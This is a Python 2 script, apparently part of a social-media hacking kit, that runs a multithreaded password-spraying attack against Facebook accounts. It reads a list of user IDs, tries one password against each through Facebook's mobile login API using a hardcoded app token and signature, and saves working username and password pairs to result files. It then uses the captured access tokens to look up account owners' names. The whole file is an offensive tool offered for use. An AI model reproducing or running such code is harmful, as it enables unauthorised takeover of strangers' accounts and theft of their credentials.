import os
import sys
import time
import json
import requests
from multiprocessing.pool import ThreadPool
import urllib
import threading

back = 0
threads = []
berhasil = []
cekpoint = []
ok = []
gagal = []

w="\033[00m"
r="\033[31;1m"
g="\033[32;1m"
y="\033[33m"
d="\033[2;31m"
b="\033[34;1m"
p="\033[35;1m"
c="\033[36;1m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"

def crack():
        global idlist,passw,file
        try:
                token=open('login.txt','r').read()
        except IOError:
                print r+"[!]"+w+" Token not found"
                os.system('rm -rf login.txt')
                time.sleep(1)
                login()
        print
        idlist = raw_input(b+'[+]'+w+' File ID : ')
        if idlist == "result/id_friends.txt":
                idlist = "../../../../result/id_friends.txt"
                pass
        else:
                idlist = idlist
                pass
        passw = raw_input(b+'[+]'+w+' Password: ')
        try:
                file = open((idlist), "r")
                print b+'[+]'+w+' Starting multi bruteforce attack'
                for x in range(100):
                        dog = threading.Thread(target=masscrack, args=())
                        dog.start()
                for dog in threads:
                        threads.append(dog)
                        dog.join()
        except IOError:
                print r+"[!]"+w+" File not found"
                print
                raw_input(w+"[ enter ]")
                print
                sys.exit(1)

def masscrack():
        global berhasil,cekpoint,gagal,up,back
        try:
                os.mkdir('out')
        except OSError:
                pass
        try:
                buka = open(idlist, "r")
                up = buka.read().split()
                while file:
                        username = file.readline().strip()
                        url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(passw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
                        data = urllib.urlopen(url)
                        mpsh = json.load(data)
                        if back == (len(up)):
                                break
                        if 'access_token' in mpsh:
                                bisa = open("result/result_live.txt", "w")
                                bisa.write(username+" | "+passw+"\n")
                                bisa.close()
                                x = requests.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])
                                z = json.loads(x.text)
                                berhasil.append("[sucessfull] username: "+username+" password: " +passw+" => "+z['name'])
                        elif 'www.facebook.com' in mpsh["error_msg"]:
                                cek = open("result/result_check.txt", "w")
                                cek.write(username+"|"+passw+"\n")
                                cek.close()
                                cekpoint.append("[checkpoint] username: "+username+" password: "+passw)
                        else:
                                gagal.append(username)
                                back +=1
                                sys.stdout.write('\r'+b+'[+]'+w+' Cracking ('+p+str(back)+w+'/'+p+str(len(up))+w+') live ('+g+str(len(berhasil))+w+') check ('+y+str(len(cekpoint))+w+') failed ('+r+str(len(gagal))+w+')');sys.stdout.flush()
        except IOError:
                print r+"[!ERROR]"+w+" Something error please try again"
                time.sleep(1)
        except requests.exceptions.ConnectionError:
                print r+"[!]"+w+" Connection error please try again later"

def hasil():
        dog = raw_input(w+'\n'+b+'[+]'+w+' Press (enter) for back to socialmedia menu')
        if dog == '':
                sys.exit(1)
        else:
                sys.exit(1)

def main():
        try:
                crack()
                hasil()
        except KeyboardInterrupt:
                sys.exit(1)

main()